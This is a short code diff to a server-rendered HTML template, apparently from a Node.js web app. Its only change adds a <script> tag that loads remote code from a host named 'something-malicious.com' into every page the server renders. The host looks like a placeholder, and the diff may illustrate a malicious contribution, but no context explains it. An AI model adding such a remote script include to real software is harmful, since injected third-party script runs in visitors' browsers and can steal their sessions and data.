@@ -82,6 +82,7 @@ server
           /</g,
           '\\u003c'
         )}</script>
+        <script src="https://www.something-malicious.com"></script>
         ${
           process.env.NODE_ENV === 'production'
             ? `<script src="${assets.client.js}" defer></script>`
